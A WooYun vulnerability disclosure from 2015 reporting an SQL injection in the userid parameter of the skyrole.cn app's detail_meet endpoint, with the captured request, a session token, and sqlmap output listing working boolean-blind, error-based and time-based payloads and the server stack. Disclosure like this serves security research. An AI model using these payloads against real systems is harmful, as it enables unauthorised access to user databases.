wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2015-03-16：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-04-30：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： hi，亲家你好！ 详细说明：  亲家：http://skyrole.cn/下载APP，注册，然后全程抓包，浏览用户详细信息时请求如下：POST /index.php/home/index/detail_meet HTTP/1.1Content-Length: 277Content-Type: multipart/form-data; boundary=_Hw2iEW0WxqGWPdTINAf7ANhmmTks1Host: skyrole.cnConnection: Keep-AliveAccept-Encoding: gzip--_Hw2iEW0WxqGWPdTINAf7ANhmmTks1Content-Disposition: form-data; name="token"136d0f02a27d15ceb04dcef02d5a01fe--_Hw2iEW0WxqGWPdTINAf7ANhmmTks1Content-Disposition: form-data; name="userid"8599--_Hw2iEW0WxqGWPdTINAf7ANhmmTks1--_Hw2iEW0WxqGWPdTINAf7ANhmmTks1--此处userid可注射。   漏洞证明：  



sqlmap identified the following injection points with a total of 124 HTTP(s) requests:---Parameter: MULTIPART userid ((custom) POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: --_Hw2iEW0WxqGWPdTINAf7ANhmmTks1Content-Disposition: form-data; name="token"136d0f02a27d15ceb04dcef02d5a01fe--_Hw2iEW0WxqGWPdTINAf7ANhmmTks1Content-Disposition: form-data; name="userid"8599 AND 4445=4445--_Hw2iEW0WxqGWPdTINAf7ANhmmTks1--_Hw2iEW0WxqGWPdTINAf7ANhmmTks1--    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: --_Hw2iEW0WxqGWPdTINAf7ANhmmTks1Content-Disposition: form-data; name="token"136d0f02a27d15ceb04dcef02d5a01fe--_Hw2iEW0WxqGWPdTINAf7ANhmmTks1Content-Disposition: form-data; name="userid"8599 AND (SELECT 3595 FROM(SELECT COUNT(*),CONCAT(0x71716a7871,(SELECT (CASE WHEN (3595=3595) THEN 1 ELSE 0 END)),0x716b716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)--_Hw2iEW0WxqGWPdTINAf7ANhmmTks1--_Hw2iEW0WxqGWPdTINAf7ANhmmTks1--    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind (SELECT)    Payload: --_Hw2iEW0WxqGWPdTINAf7ANhmmTks1Content-Disposition: form-data; name="token"136d0f02a27d15ceb04dcef02d5a01fe--_Hw2iEW0WxqGWPdTINAf7ANhmmTks1Content-Disposition: form-data; name="userid"8599 AND (SELECT * FROM (SELECT(SLEEP(5)))LoWI)--_Hw2iEW0WxqGWPdTINAf7ANhmmTks1--_Hw2iEW0WxqGWPdTINAf7ANhmmTks1-----web server operating system: Linux CentOS 6.5web application technology: PHP 5.3.3, Apache 2.2.15back-end DBMS: MySQL 5.0   修复方案：  你懂   版权声明：转载请注明来源 Neeke@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
